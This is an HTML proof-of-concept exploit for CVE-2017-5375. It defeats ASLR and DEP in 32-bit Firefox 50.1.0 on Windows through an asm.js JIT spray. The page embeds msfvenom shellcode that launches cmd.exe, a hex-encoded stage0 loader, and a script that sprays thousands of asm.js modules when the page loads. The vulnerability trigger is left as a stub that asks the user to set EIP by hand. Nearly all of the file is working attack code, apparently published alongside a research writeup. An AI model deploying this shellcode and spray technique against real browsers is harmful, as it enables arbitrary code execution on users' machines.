<!DOCTYPE HTML>
<html>

<!--

    FULL ASLR AND DEP BYPASS USING ASM.JS JIT SPRAY (CVE-2017-5375)
    Dynamic 3-byte Stager PoC

    Tested on:

    Release 50.1.0 32-bit - Windows 8.1 / Windows 10
    https://ftp.mozilla.org/pub/firefox/releases/50.1.0/win32/en-US/Firefox%20Setup%2050.1.0.exe

    Howto:

    1) serve PoC over network and open it in Firefox 50.1.0
    2) set eip to 0x1c1c0053 and continue execution
    3) if you don't see cmd.exe, open processexplorer and verify that cmd.exe was spawned by firefox.exe

    Writeup: https://rh0dev.github.io/blog/2017/the-return-of-the-jit/
    
    (C) Rh0

    Jul. 13, 2017

-->

<head>
<meta charset=UTF-8 />
<script>

// $ msfvenom --payload windows/exec CMD=cmd.exe EXITFUNC=seh
payload = '' +
	'\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b' +
	'\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7' +
	'\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf' +
	'\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c' +
	'\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01' +
	'\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31' +
	'\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d' +
	'\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66' +
	'\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0' +
	'\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f' +
	'\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00' +
	'\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xfe\x0e' +
	'\x32\xea\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a' +
	'\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53' +
	'\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00'

max_payload_sz = 1029 // DO NOT CHANGE (hardcoded in stage0)

// stage0 will load and execute payload
stage0 = [
	'90db31', '9030b3', '1b8b64', '0c5b8b', '1c5b8b', 'b9006a', '904c4c', 
	'902eb1', '5144b5', 'b99090', '903233', '9045b1', '514cb5', 'b99090', 
	'904e52', '904bb1', '5145b5', '590e6a', '4fe789', '086b8b', '20738b', 
	'471b8b', '2ae349', '90c031', '90ad66', '9c613c', '077c9d', '90202c', 
	'9c073a', 'd7749d', '90bdeb', 'b9006a', '90636f', '906cb1', '516cb5', 
	'b99090', '90416c', '9075b1', '5161b5', 'b99090', '907472', '9056b1', 
	'5169b5', '90eb89', '3cc583', '006d8b', '90dd01', '78c583', '006d8b', 
	'90dd01', '20458b', '90d801', '90d231', '90e789', '590d6a', '10348b', 
	'90de01', '90a6f3', '900de3', '04c283', '90dbeb', '247d8b', '90df01', 
	'90ead1', '90d701', '90d231', '178b66', '1c7d8b', '90df01', '02e2c1', 
	'90d701', '903f8b', '90df01', '90406a', '90c031', '5030b4', '5010b4', 
	'90006a', '90d7ff', '90c931', '9004b5', '9005b1', '90ebd9', '2434d9', 
	'90e689', '0cc683', '90368b', '5fc683', '90c789', '1e8b66', '1f8966', 
	'02c683', '02c783', '901e8a', '901f88', '03c683', '01c783', '03e983', 
	'9008e3', '90cceb', '90e0ff', '24248d'
]

asm_js_header = '' +
'function asm_js_module(){' + 
'        "use asm";' +
'        function payload_code(){' + 
'            var val = 0;'

asm_js_footer = '' +
'            return val|0;' +
'    }' +
'    return payload_code;' +
'};' +
/* triggers creation of many RX modules */
'spray_modules();'

nops = 'val = (val + 0xa8909090)|0;'


function load_asmjs(){
    code = ""

    /* nops */
    for (var i = 0; i <= 40; i++){
        code += nops
    }

    /* stage0 or custom payload */
    for (i in stage0){
        /* for a stage0 array with string elements consisting of 3 hex bytes*/
        code += 'val = (val + 0xa8' + stage0[i] + ')|0;'
    }

    if (payload.length > max_payload_sz){
        alert("Error: shellcode payload is too big")
        return
    }

    /* append binary payload (if any in case of stage0 laoder is used) */
    for (var i=0; i < payload.length; i+=3){
        code += 'val = (val + 0xa8';
        val = payload.slice(i, i + 3)
        /* only for last iteration */
        while (val.length < 3) val += "\x90"
        for (var j=2; j>=0; j--){
            code += (0x100 + val.charCodeAt(j)).toString(16).slice(1)
        }
        code += ')|0;'
    }

    /* fill up payload space */
    if (payload.length > 0){
        for (var i=0; i < (max_payload_sz - payload.length); i+=3){
            code += nops 
        }
    }

    /* https://developer.mozilla.org/en-US/docs/Games/Techniques/Async_scripts
     */
    asm_js = asm_js_header + code + asm_js_footer
    /* create blob script and load it */
    var blob = new Blob([asm_js]);
    var script = document.createElement('script');
    var url = URL.createObjectURL(blob);
    script.onload = script.onerror = function() { URL.revokeObjectURL(url); };
    script.src = url;
    /* triggers asm module compilation and spray_modules() execution */
    document.body.appendChild(script);
}


function spray_modules(){
    sprayed = []
    for (var i=0; i<= 0x1800; i++){
        sprayed[i] = asm_js_module()
    }

    trigger_vuln()
}

/* GET EIP CONTROL WITH YOUR VULN HERE */
/* SET EIP TO 0x1C1C0053 ON WINDOWS 32-bit*/
function trigger_vuln(){
    /* You may need to adjust this address dependent on your vuln and Firefox version*/
    alert("Set EIP to 0x1c1c0053 (Firefox Release <= 50.1.0 32-bit - Windows 8.1/10) with your vuln here or in WinDBG")
}

</script>
</head>
<body style=background:black onload=load_asmjs()>
<h2 style=color:green>
&#x03C1;
</h2>
</body>
</html>
